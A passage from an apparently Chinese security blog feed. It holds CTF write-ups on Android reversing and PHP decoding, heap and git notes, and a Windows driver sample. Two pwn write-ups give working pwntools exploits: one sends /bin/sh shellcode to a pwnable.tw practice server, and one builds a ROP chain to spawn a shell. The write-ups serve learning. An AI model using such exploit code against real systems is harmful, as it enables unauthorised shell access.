0x6528, 27501, 0x9820, 0x90AF, 0x9545, 0xF192, 0xA9E9, 0x2405, 9879, 0x3864, 60468, 0x4DD6, 0xB85E, 8406, 0xFC9A};        a.d = new int[]{0, 0xEB9D9218, -370404060, 0xF0A59DD2, -494024809, 0xF7EFFC3F, 54930974, 0xF6B60C82, 0x203630EA, 0xF99AF01A, 0xF85E01A6, 0xFCF9241, 0x1072E161, 119059597, 202392013, 0x10E88ED9, 0x786F15C, -68971076, 0xF91DD26, 0xBC673D6, 0xFF3B4367, -10293675, 0x598502B, 0x7406995, 0x9FB416F, 0x758311F, 221507, 0xF6EB9D4, 180963987, 107841171, 41609001, 0x107B88B5, 0xA21BFA2, 0x1075D862};    }    public static boolean a(String arg8) {        boolean v1 = false;        if(arg8.length() == a.b.length) {            int[] v4 = new int[a.a.length];            v4[0] = 0;            byte[] v5 = arg8.getBytes();            int v6 = v5.length;            int v0 = 0;            int v3 = 1;            while(v0 &lt; v6) {                v4[v3] = v5[v0];                ++v3;                ++v0;            }            v0 = 0;            while(true) {                if(v0 &gt;= a.c.length) {                    break;                }                else if(a.a[v0] == a.b[v0] * v4[v0] * v4[v0] + a.c[v0] * v4[v0] + a.d[v0] &amp;&amp; a.a[v0 + 1] == a.b[v0] * v4[v0 + 1] * v4[v0 + 1] + a.c[v0] * v4[v0 + 1] + a.d[v0]) {                    ++v0;                    continue;                }                return v1;            }            v1 = true;        }        return v1;    }}</code></pre><blockquote><p>a.b[v0] <em> v4[v0] </em> v4[v0] + a.c[v0] <em> v4[v0] + a.d[v0] &amp;&amp; a.a[v0 + 1] == a.b[v0] </em> v4[v0 + 1] <em> v4[v0 + 1] + a.c[v0] </em> v4[v0 + 1] + a.d[v0] 可以将这句话改进一下进行爆破</p></blockquote><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">a = [0, 146527998, 205327308, 94243885, 138810487, 408218567, 77866117, 71548549, 563255818, 559010506, 449018203, 576200653, 307283021, 467607947, 314806739, 341420795, 341420795, 469998524, 417733494, 342206934, 392460324, 382290309, 185532945, 364788505, 210058699, 198137551, 360748557, 440064477, 319861317, 676258995, 389214123, 829768461, 534844356, 427514172, 864054312]b = [13710, 46393, 49151, 36900, 59564, 35883, 3517, 52957, 1509, 61207, 63274, 27694, 20932, 37997, 22069, 8438, 33995, 53298, 16908, 30902, 64602, 64028, 29629, 26537, 12026, 31610, 48639, 19968, 45654, 51972, 64956, 45293, 64752, 37108]c = [38129, 57355, 22538, 47767, 8940, 4975, 27050, 56102, 21796, 41174, 63445, 53454, 28762, 59215, 16407, 64340, 37644, 59896, 41276, 25896, 27501, 38944, 37039, 38213, 61842, 43497, 9221, 9879, 14436, 60468, 19926, 47198, 8406, 64666]d = [0, -341994984, -370404060, -257581614, -494024809, -135267265, 54930974, -155841406, 540422378, -107286502, -128056922, 265261633, 275964257, 119059597, 202392013, 283676377, 126284124, -68971076, 261217574, 197555158, -12893337, -10293675, 93868075, 121661845, 167461231, 123220255, 221507, 258914772, 180963987, 107841171, 41609001, 276531381, 169983906, 276158562]s = &#39;&#39;for v0 in range(1,len(c)):    for i in range(0,255):        if a[v0] == b[v0] * i * i + c[v0] * i + d[v0] and a[v0] == b[v0-1] * i * i + c[v0-1] * i +d[v0-1]:            s += chr(i)print s#a[v0] == b[v0] * v4[v0] * v4[v0] + c[v0] * v4[v0] + d[v0]#a[v0] == b[v0-1] * v4[v0] * v4[v0] + c[v0-1] * v4[v0] +d[v0-1]## flag{MAth_i&amp;_GOOd_DON7_90V_7hInK?}</code></pre><h3 id="DDCTF-Easy"><a href="#DDCTF-Easy" class="headerlink" title="DDCTF-Easy"></a>DDCTF-Easy</h3><p><img src="/images/pasted-12.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="jadx定位关键代码"><a href="#jadx定位关键代码" class="headerlink" title="jadx定位关键代码"></a>jadx定位关键代码</h4><p><img src="/images/pasted-13.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>输入的字符与i()函数返回的字符串相比较</p></blockquote><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">m = &quot;com.didi_ctf.flagapp.FlagActivity&quot;p = [-40, -62, 107, 66, -126, 103, -56, 77, 122, -107, -24, -127, 72, -63, -98, 64, -24, -5, -49, -26, 79, -70, -26, -81, 120, 25, 111, -100, -23, -9, 122, -35, 66, -50, -116, 3, -72, 102, -45, -85, 0, 126, -34, 62, 83, -34, 48, -111, 61, -9, -51, 114, 20, 81, -126, -18, 27, -115, -76, -116, -48, -118, -10, -102, -106, 113, -104, 98, -109, 74, 48, 47, -100, -88, 121, 22, -63, -32, -20, -41, -27, -20, -118, 100, -76, 70, -49, -39, -27, -106, -13, -108, 115, -87, -1, -22, -53, 21, -100, 124, -95, -40, 62, -69, 29, 56, -53, 85, -48, 25, 37, -78, 11, -110, -24, -120, -82, 6, -94, -101]q = [-57, -90, 53, -71, -117, 98, 62, 98, 101, -96, 36, 110, 77, -83, -121, 2, -48, 94, -106, -56, -49, -80, -1, 83, 75, 66, -44, 74, 2, -36, -42, -103, 6, -115, -40, 69, -107, 85, -78, -49, 54, 78, -26, 15, 98, -70, 8, -90, 94, -61, -84, 64, 112, 51, -29, -34, 126, -21, -126, -71, -31, -24, -60, -2, -81, 66, -84, 85, -91, 10, 84, 70, -8, -63, 26, 126, -76, -104, -123, -71, -126, -62, -23, 11, -39, 70, 14, 59, -101, -39, -124, 91, -109, 102, -49, 21, 105, 0, 37,-127, -57, 117, 110, -115, -86, 56, 25, -46, -55, 7, -125, 109, 76, 104, -15, 82, -53, 18, -28, -24]bArr = [i for i in range(0,len(p))]for i in range(0,len(bArr)):    bArr[i] = p[i] ^ q[i]b = bArr[0]i2 = 0while bArr[b+i2] != 0:    i2 += 1bArr2 = [i for i in range(0,i2)]for j in range(0,i2):    bArr2[j] = bArr[b+j]print &#39;&#39;.join(chr(i) for i in bArr2)flag:DDCTF-3ad60811d87c4a2dba0ef651b2d93476@didichuxing.com</code></pre><h3 id="app2"><a href="#app2" class="headerlink" title="app2"></a>app2</h3><p><img src="/images/pasted-14.png" srcset="/img/loading.gif" alt="upload successful"></p><h4 id="jadx"><a href="#jadx" class="headerlink" title="jadx"></a>jadx</h4><p><img src="/images/pasted-15.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>这题是有脑洞的，之前做过所以很快定位到了需要解密的字符串</p></blockquote><p><img src="/images/pasted-16.png" srcset="/img/loading.gif" alt="upload successful"></p><p><img src="/images/pasted-17.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>AES_128_ECB_PKCS5Padding_Decrypt加密，密钥为thisisatestkey==</p></blockquote><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p><img src="/images/pasted-18.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>总体来说不算太难，除了最后第一是个坑之外，基本没涉及到so层的概念，是些入门很好的题目，感谢平台提供的练习机会</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwnable.tw-start</title>
    <link href="/pwnable-tw-start.html"/>
    <url>/pwnable-tw-start.html</url>
    
    <content type="html"><![CDATA[<h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p><img src="/images/pasted-0.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/images/pasted-3.png" srcset="/img/loading.gif" alt="upload successful"></p><h3 id="ida查看"><a href="#ida查看" class="headerlink" title="ida查看"></a>ida查看</h3><p><img src="/images/pasted-1.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>发现只有两个函数，_start 和 _exit ，看到int 80得知，此程序是通过系统调用的方式达到调用函数的目的</p></blockquote><p><img src="/images/pasted-2.png" srcset="/img/loading.gif" alt="upload successful"></p><blockquote><p>gdb调试得知偏移为20</p></blockquote><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level=&quot;debug&quot;pro = remote(&quot;chall.pwnable.tw&quot;,10000)ret = 0x8048087shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&quot;&#39;&#39;&#39;shellcode = asm(&#39;\n&#39;.join([    &#39;push %d&#39; % u32(&#39;/sh\0&#39;),    &#39;push %d&#39; % u32(&#39;/bin&#39;),    &#39;xor edx, edx&#39;,    &#39;xor ecx, ecx&#39;,    &#39;mov ebx, esp&#39;,    &#39;mov eax, 0xb&#39;,    &#39;int 0x80&#39;,]))&#39;&#39;&#39;pro.readuntil(&quot;CTF:&quot;)pro.send(&#39;a&#39;*20 + p32(ret))shell_addr = u32(pro.recv()[:4])pro.send(&#39;A&#39;*20+p32(shell_addr+20)+shellcode)pro.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>writeup</tag>
      
      <tag>pwnable.tw</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Heap的学习(1)</title>
    <link href="/Heap%E7%9A%84%E5%AD%A6%E4%B9%A0-1.html"/>
    <url>/Heap%E7%9A%84%E5%AD%A6%E4%B9%A0-1.html</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>对于堆方面的内容，在没有别人帮助的情况下，学起来就很吃力，不像栈那么好理解，本篇记录我对堆的一些了解，不足之处，还望斧正。</p></blockquote><h3 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h3><blockquote><p>栈无法满足将函数内部的数据传递到函数的外部，虽然有全局变量可以传递，但是不能动态的产生，只能在编译的时候定义，在很多情况下显得鸡肋，这时候堆(Heap)就成了一种选择。堆是一个巨大的空间，常常占据着整个虚拟空间的绝大部分，在这片空间里，程序可以请求一块连续的内存并自由使用，直到程序主动放弃之前都会有效。</p></blockquote><h3 id="堆管理"><a href="#堆管理" class="headerlink" title="堆管理"></a>堆管理</h3><blockquote><p>程序向操作系统申请一块适当大小的堆空间，然后有程序自己管理这块空间，具体来讲，管理着堆空间分配的往往是程序的运行库，运行库相当于从系统批发了一块较大的堆空间，然后零售给程序用，当售完或程序有大量的内存需求时，在根据实际需求再次向系统申请进货，运行库通过堆的分配算法来管理程序的对空间。</p></blockquote><h4 id="Linux下提供两种堆空间分配的方式，及两个系统调用："><a href="#Linux下提供两种堆空间分配的方式，及两个系统调用：" class="headerlink" title="Linux下提供两种堆空间分配的方式，及两个系统调用："></a>Linux下提供两种堆空间分配的方式，及两个系统调用：</h4><h5 id="brk-系统调用"><a href="#brk-系统调用" class="headerlink" title="brk()  系统调用"></a>brk()  系统调用</h5><h6 id="brk-的c语言形式声明如下："><a href="#brk-的c语言形式声明如下：" class="headerlink" title="brk()的c语言形式声明如下："></a>brk()的c语言形式声明如下：</h6><pre><code class="c">int brk(void* end_data_segment)实际作用就是设置进程数据段(Linux下将数据段和BSS段合在一起统称位数据段)的结束地址，及它可以扩大或缩小数据段，达到扩大或缩小堆空间的效果。glibc中还有一个函数交sbrk，它是对brk函数的封装，只不过参数和返回值略有不同，sbrk以一个增量(Increment)作为参数，及需要增加(负数为减少)的空间大小，返回值是增加或减少后数据段的结束地址</code></pre><h5 id="mmap-系统调用"><a href="#mmap-系统调用" class="headerlink" title="mmap() 系统调用"></a>mmap() 系统调用</h5><h6 id="mmap-的c语言形式声明如下："><a href="#mmap-的c语言形式声明如下：" class="headerlink" title="mmap()的c语言形式声明如下："></a>mmap()的c语言形式声明如下：</h6><pre><code class="c">void *mmap(   void *start,      指定申请空间的起始地址，如果置为0，那么Linux会自动挑选合适的起始地址   size_t length,    指定申请空间的长度   int prot,         申请空间的权限(可读，可写，可执行)   int flags,        映射类型(文件映射、匿名空间)   int fd,           用于文件映射时指定文件描述符   off_t offset      用于文件映射时指定文件偏移);作用就是向操作系统申请一段虚拟地址空间，当然这块虚拟地址空间可以映射到某个文件(这也是这个系统跳用最初的作用)，当他不将地址空间映射到某个文件时，称这段空间为匿名空间，匿名空间可以拿来当作堆空间。</code></pre><h3 id="堆结构"><a href="#堆结构" class="headerlink" title="堆结构"></a>堆结构</h3><p>这里可以参考<a href="https://www.anquanke.com/post/id/163971#h2-2" target="_blank" rel="noopener">CTF pwn 中最通俗易懂的堆入坑指南</a>，在看博客的时候产生一个疑问，为什么malloc(8)的值为0x21，后来自己写了程序，调试查看以及在网友的帮助下知道了原因。</p><pre><code class="c">64位系统malloc(8) 由于需要内存对齐，所以8需要对齐到16，然后加上pre size、size以及prev_inuse的值，也就是文中的16+8+8+1=0x21的由来，但是当malloc(24)的时候，发现系统给的空间也是0x21，这就又产生了疑问，不是应该为32+8+8+1=0x31吗，后来询问网友得知，内存空间复用这个神奇的操作，也就是当前的堆会占用下一个堆的pre size(前提：下一个堆的前一个chunk是使用状态)，所以malloc(24) 24&lt;16+8 所以，还是会分配0x21的空间给他</code></pre><p><img src="/images/6/1.png" srcset="/img/loading.gif" alt="64位情况"></p><blockquote><p>32位和64位原理一样，只不过，对齐的到的大小不一样，64位对齐到16，32位对齐到8</p></blockquote><p><img src="/images/6/2.png" srcset="/img/loading.gif" alt></p><blockquote><p>可以观察到，程序在第一次malloc之后会产生heap，并且大小是132kb，个人测试，32位也同样是132kb，往后，如果程序再malloc的时候就会从这里面申请，132kb的空间就是arena，由于是主线程分配的，所以也叫main arena</p></blockquote><p><img src="/images/6/3.png" srcset="/img/loading.gif" alt></p><blockquote><p>top chunk的size会由于每次的malloc而减小</p></blockquote><h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><blockquote><p>将free掉的chunk放在不同的bin中</p></blockquote><pre><code class="c">fast binsmall binlarge binunsorted bin</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>对于堆，总是感觉学了一遍，两遍，都不清楚到底是干嘛的，更加谈不上如何利用</p></blockquote><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>《程序员的自我修养》</p><p><a href="https://www.anquanke.com/post/id/163971#h2-2" target="_blank" rel="noopener">CTF pwn 中最通俗易懂的堆入坑指南</a></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN 学习—某平台ROP2 writeup</title>
    <link href="/PWN-%E5%AD%A6%E4%B9%A0%E2%80%94%E6%9F%90%E5%B9%B3%E5%8F%B0ROP2-writeup.html"/>
    <url>/PWN-%E5%AD%A6%E4%B9%A0%E2%80%94%E6%9F%90%E5%B9%B3%E5%8F%B0ROP2-writeup.html</url>
    
    <content type="html"><![CDATA[<h3 id="64位栈帧学习"><a href="#64位栈帧学习" class="headerlink" title="64位栈帧学习"></a>64位栈帧学习</h3><p><img src="/images/1/1.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><h4 id="本能反应"><a href="#本能反应" class="headerlink" title="本能反应"></a>本能反应</h4><p><img src="/images/1/2.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><blockquote><p>RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表<br>Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过<br>NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过<br>PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 </p></blockquote><h4 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h4><p><img src="/images/1/3.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><blockquote><p>发现输入一定的长度，程序就崩溃了</p></blockquote><h4 id="ida打开程序"><a href="#ida打开程序" class="headerlink" title="ida打开程序"></a>ida打开程序</h4><p><img src="/images/1/4.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><blockquote><p>查看要程序逻辑<br>发现存在栈溢出漏洞<br>输入长度大于 0xC (0x4 + 0x8) 面就是我们的天下了</p></blockquote><h5 id="查看函数表"><a href="#查看函数表" class="headerlink" title="查看函数表"></a>查看函数表</h5><p><img src="/images/1/5.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h5 id="发现函数joke"><a href="#发现函数joke" class="headerlink" title="发现函数joke"></a>发现函数joke</h5><p><img src="/images/1/6.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><blockquote><p>似乎用不到的函数</p></blockquote><h5 id="接下来查看字符串"><a href="#接下来查看字符串" class="headerlink" title="接下来查看字符串"></a>接下来查看字符串</h5><p><img src="/images/1/7.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><blockquote><p>我无敌的/bin/sh字符串竟然没有，还好有gets和system函数</p></blockquote><h5 id="思考利用方法"><a href="#思考利用方法" class="headerlink" title="思考利用方法"></a>思考利用方法</h5><blockquote><p>调用gets函数像bss段写入/bin/sh，然后调用system函数执行system(“/bin/sh”);</p></blockquote><h5 id="实操过程"><a href="#实操过程" class="headerlink" title="实操过程"></a>实操过程</h5><p><img src="/images/1/8.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><blockquote><p>这里解释一下，由于gets函数只有一个参数，所以调用gets函数时，需要向rdi传入传入那个参数<br>pop rdi ; ret 的作用就是将当前栈顶的值存到rdi中<br>所以构造payload 为 p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)<br>程序执行到pop_rdi_ret时的栈顶就是bss的地址，然后就将bss地址存入rdi中，然后调用gets函数</p></blockquote><pre><code>接下来时调用system函数</code></pre><blockquote><p>我们知道，调用一个函数后，那个函数的下一个地址就会成为函数执行完后需要执行的第一个地方<br>我们在payload后面追加p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)，原理与gets函数相同，<br>gets往bss地址写入/bin/sh，system调用bss地址的/bin/sh，即达到了调用/bin/sh的作用</p></blockquote><h5 id="此时栈空间如图"><a href="#此时栈空间如图" class="headerlink" title="此时栈空间如图"></a>此时栈空间如图</h5><p><img src="/images/1/9.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h5 id="附上payload"><a href="#附上payload" class="headerlink" title="附上payload"></a>附上payload</h5><pre><code class="python">from pwn import *pro = remote(&quot;ip&quot;,port)pros = ELF(&#39;./rop2&#39;)bss = 0x6010F0pop_rdi_ret = 0x4008e3system_addr = pros.symbols[&#39;system&#39;]gets_addr = pros.symbols[&#39;gets&#39;]payload = &#39;a&#39;*4 +&#39;a&#39;*8 payload += p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)payload += p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)pro.readuntil(&quot;~&quot;)pro.sendline(payload)pro.sendline(&quot;/bin/sh&quot;)pro.interactive()</code></pre><p><img src="/images/1/10.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><pre><code>&gt; PWN 学习之路永无止境</code></pre>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>writeup</tag>
      
      <tag>pwntools</tag>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git学习小记</title>
    <link href="/git%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0.html"/>
    <url>/git%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0.html</url>
    
    <content type="html"><![CDATA[<h3 id="一、设置账户名和账户邮箱"><a href="#一、设置账户名和账户邮箱" class="headerlink" title="一、设置账户名和账户邮箱"></a>一、设置账户名和账户邮箱</h3><pre><code class="bash">git config --global user.name &quot;name&quot;git config --global user.email &quot;name@gmail.comgit config --global http.proxy http://example.com:port</code></pre><h3 id="二、验证账户名和账户邮箱"><a href="#二、验证账户名和账户邮箱" class="headerlink" title="二、验证账户名和账户邮箱"></a>二、验证账户名和账户邮箱</h3><pre><code class="bash">git config --global user.namegit config --global user.email</code></pre><h3 id="三、初始化仓库"><a href="#三、初始化仓库" class="headerlink" title="三、初始化仓库"></a>三、初始化仓库</h3><pre><code class="bash">git init 会生成 .git 文件夹，关于这个仓库的配置</code></pre><h3 id="四、添加文件及文件夹"><a href="#四、添加文件及文件夹" class="headerlink" title="四、添加文件及文件夹"></a>四、添加文件及文件夹</h3><pre><code class="bash">git add name添加所有文件git add .</code></pre><h3 id="五、添加描述-必须添加"><a href="#五、添加描述-必须添加" class="headerlink" title="五、添加描述(必须添加)"></a>五、添加描述(必须添加)</h3><pre><code class="bash">git commit -m &quot;hello world&quot;</code></pre><h3 id="六、查看状态"><a href="#六、查看状态" class="headerlink" title="六、查看状态"></a>六、查看状态</h3><pre><code class="bash">git status</code></pre><h3 id="七、查看修改的文件"><a href="#七、查看修改的文件" class="headerlink" title="七、查看修改的文件"></a>七、查看修改的文件</h3><pre><code class="bash">git diff -- filename</code></pre><h3 id="八、撤销修改"><a href="#八、撤销修改" class="headerlink" title="八、撤销修改"></a>八、撤销修改</h3><pre><code class="bash">git checkout filename</code></pre><h3 id="九、撤销修改-针对git-add提交之后的"><a href="#九、撤销修改-针对git-add提交之后的" class="headerlink" title="九、撤销修改(针对git add提交之后的)"></a>九、撤销修改(针对git add提交之后的)</h3><pre><code class="bash">git reset HEAD filenamegit checkout filename</code></pre><h3 id="十、查看提交记录"><a href="#十、查看提交记录" class="headerlink" title="十、查看提交记录"></a>十、查看提交记录</h3><pre><code class="bash">git loggit log logid -1 -p-1  表示只看到上面的一条记录-p 表示查看这条记录的所有信息</code></pre><h3 id="十一、上传文件"><a href="#十一、上传文件" class="headerlink" title="十一、上传文件"></a>十一、上传文件</h3><pre><code class="bash">git remote add origin github仓库地址如遇&quot;fatal: remote origin already exists.&quot;此问题输入 git remote rm origingit push origin master</code></pre><h3 id="十二、分支"><a href="#十二、分支" class="headerlink" title="十二、分支"></a>十二、分支</h3><pre><code class="bash">查看分支git branch当前分支前面会有一个*创建分支git branch version1.0切换分支git checkout version1.0将version1.0同步到当前分支git merge version1.0删除分支git branch -D version1.0克隆远程项目git clone git@github.com:name/项目名.git将当前修改上传到服务器git push origin master将远程修改同步到本地git fetch origin master注：此方法不会将修改同步到当前分支，而是会同步到origin/master分支上，需要使用git merge origin/master同步到当前分支git pull origin master此方法是fetch和merge两者的合并</code></pre><h3 id="十三、其他"><a href="#十三、其他" class="headerlink" title="十三、其他"></a>十三、其他</h3><pre><code class="bash">创建密钥ssh-keygen -t rsa -C &quot;name@gmail.com&quot;将公钥添加到githubcat .ssh/id_rsa.pub</code></pre>]]></content>
    
    
    <categories>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>attackworld-web2</title>
    <link href="/attackworld-web2.html"/>
    <url>/attackworld-web2.html</url>
    
    <content type="html"><![CDATA[<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre><code class="php">&lt;?php $miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;; function encode($str){     $_o=strrev($str);     // echo $_o;     for($_0=0;$_0&lt;strlen($_o);$_0++){         $_c=substr($_o,$_0,1);         $__=ord($_c)+1;         $_c=chr($__);         $_=$_.$_c;        }      return str_rot13(strrev(base64_encode($_))); } highlight_file(__FILE__); /*    逆向加密算法，解密$miwen就是flag */ ?&gt; </code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><blockquote><p>源码：反转字符-每位字符加一-base64-字符反转-rot13<br>解码：rot13-字符反转-base64-每位字符减一-字符反转</p></blockquote><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><pre><code class="python">import base64def Upper(ch):    if ch&gt;=&#39;A&#39; and ch&lt;=&#39;Z&#39;:        return Truedef Lower(ch):    if ch&gt;=&#39;a&#39; and ch&lt;=&#39;z&#39;:        return Truedef rot13(s):    flag = &#39;&#39;    for i in s:        if Upper(i) == True:             if i&gt;=&#39;A&#39; and i&lt;=&#39;M&#39;:                 flag += chr(ord(i)+13)             else:                 flag += chr(ord(i)-13)        elif Lower(i) == True:             if i&gt;=&#39;a&#39; and i&lt;=&#39;m&#39;:                 flag += chr(ord(i)+13)             else:                 flag += chr(ord(i)-13)        else:             flag += i    return flagflag = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;flag = list(rot13(flag))flag.reverse()flag = &#39;&#39;.join(i for i in flag)flag = base64.b64decode(flag)flag = list(flag)strs = &quot;&quot;for i in range(0,len(flag)):    strs += chr(ord(flag[i]) -1)strs = list(strs)strs.reverse()print &#39;&#39;.join(i for i in strs)</code></pre>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WDF-helloworld</title>
    <link href="/WDF-helloworld.html"/>
    <url>/WDF-helloworld.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>Windows WDF驱动开发简单helloworld入门</p></blockquote><h2 id="helloworld-h"><a href="#helloworld-h" class="headerlink" title="helloworld.h"></a>helloworld.h</h2><pre><code class="c">/*预处理：用来避免头文件被重复包含还可以用#pragma once 防止头文件被重复包含，保证头文件只被编译一次，可移植性差第一种：    #ifndef __SOMEFILE_H__    #define __SOMEFILE_H__    ... ... // 声明、定义语句    #endif第二种：    #pragma once    ... ... // 声明、定义语句*/#ifndef __HELLOWORLD__ //预处理#define __HELLOWORLD__ //预处理// 包含驱动所需的头文件#include &lt;ntddk.h&gt;#include &lt;wdf.h&gt;// 这是一个结构体的定义，用以描述驱动程序的设备拓展。它保存了我们自定义所需的一些信息，有助于更加方便的编程。typedef struct _DEVICE_EXTENSION {    PDEVICE_OBJECT DeviceObject;    UNICODE_STRING DeviceName;    UNICODE_STRING SymbolicLink;} DEVICE_EXTENSION, *PDEVICE_EXTENSION;// 相关函数的声明，这些函数的具体实现存在于定义文件中NTSTATUS DriverEntry(    IN PDRIVER_OBJECT DriverObject,    IN PUNICODE_STRING RegPath);VOID DriverUnload(    IN PDRIVER_OBJECT DriverObject);NTSTATUS DefaultDispath(    IN PDEVICE_OBJECT DeviceObject,    IN PIRP Irp);#endif //预处理</code></pre><h2 id="helloworld-c"><a href="#helloworld-c" class="headerlink" title="helloworld.c"></a>helloworld.c</h2><pre><code class="c">// 包含指定的声明文件。为每个定义文件写一个声明文件是一个不错的选择#include &quot;helloworld.h&quot;// 这些是预处理。在驱动开发中，需要指定每一个函数是分页内存还是非分页内存。// INIT 标识是指定函数在驱动加载时使用，是初始化相关函数，驱动成功加载以后可以从内存卸载。// PAGE 标识是指此函数在驱动运行时可以被交换到磁盘上，如果不指定，编译器默认是非分页内存。// 一般情况下，我们不需要考虑这些问题，但有些特殊情况，代码是不予许被交换到磁盘上的，否则导致系统蓝屏或重启。// 注：函数的声明必须在这些指定内存分配的预处理器之前，否则无法通过编译。#pragma alloc_text(INIT,DriverEntry)#pragma alloc_text(PAGE,DefaultDispatch)#pragma alloc_text(PAGE,DriverUnload)// 是DriverEntry函数的具体实现。DriverEntry是驱动程序的入口函数。有操作系统内核的I/O管理器调用。NTSTATUS DriverEntry(    IN PDRIVER_OBJECT Driver,    IN PUNICODE_STRING RegPath) {    // 函数相关变量的定义    // C语言中变量必须定义在函数体的开始处，否则出现编译错误。    // C++ 语言没有这种限制    NTSTATUS status;    PDEVICE_OBJECT deviceObject;    PDEVICE_EXTENSION deviceExtension;    UNICODE_STRING symbolicLink;    UNICODE_STRING deviceName;    ULONG i;    // KdPrint 和 DbgPrint是一个函数，KdPrint 是 DbgPrint的宏定义凡是，用以打印调试信息，好处在于    // 调试版本编译时，KdPrint会打印调试信息，    // 发布版本编译时，KdPrint将会被全部移除。    KdPrint((&quot;Enter HelloWorld DriverEntry\n&quot;));    // 一个宏，经常被用来指定参数未被引用，可以避免不必要的警告    // 做到开发驱动程序不出警告是基础，因为驱动程序会导致系统出现各种各样的问题    UNREFERENCED_PARAMETER(RegPath);    // 对一个Unicode字符串进行初始化，Windows内核大量使用Unicode字符串，其具体操作有一系列函数(Rtl系列，微软推荐的运行时函数)    RtlInitUnicodeString(&amp;deviceName, L&quot;\\Device\\helloworld&quot;);    // 宏IRP_MJ_MAXIMUM_FUNCTION代表驱动程序最大的派遣函数指针数，这里使用默认的派遣函数初始化他们。然后紧跟着下面修改我们不打算使用默认的派遣函数指针。    // 类似于定义数组，初始化数组    // 派遣函数：又被称为回调函数。在驱动程序中这些派遣函数是我们主要工作重点    for (i = 0; i &lt;= IRP_MJ_MAXIMUM_FUNCTION; i++)    {        Driver-&gt;MajorFunction[i] = DefaultDispatch;    }    // 